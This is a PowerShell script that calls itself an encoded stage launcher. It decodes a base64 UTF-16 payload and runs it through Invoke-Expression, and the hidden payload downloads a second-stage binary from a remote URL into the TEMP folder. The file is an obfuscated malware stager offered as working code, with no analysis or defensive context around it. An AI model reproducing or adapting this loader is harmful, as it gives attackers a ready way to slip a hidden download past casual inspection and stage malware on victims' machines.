
<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.

.EXAMPLE
    PS> .\stage2.ps1
#>
$EncodedStage = (
    "JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAu" +
    'AG4AZQB0AC8AYwBkAG4ALwBzAHQAYQBnAGUAMgAuAGIAaQBuACIAOwAgAEkAbgB2AG8AawBlAC0A' +
    'VwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAFMAdABhAGcAZQAyAFUAcgBsACAALQBP' +
    "AHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAHMAdABhAGcAZQAyAC4AYgBpAG4A" +
    'IgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcA'
)
$DecodedText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedStage))
try {
    Write-Verbose ("Decoded stage length: " + $DecodedText.Length)
    if ([string]::IsNullOrWhiteSpace($DecodedText)) {
        throw "Decoded stage was empty"
    }
    Invoke-Expression $DecodedText
}
catch {
    Write-Warning "Encoded stage failed: $($_.Exception.Message)"
}

Write-Output "stage 25 initialized"
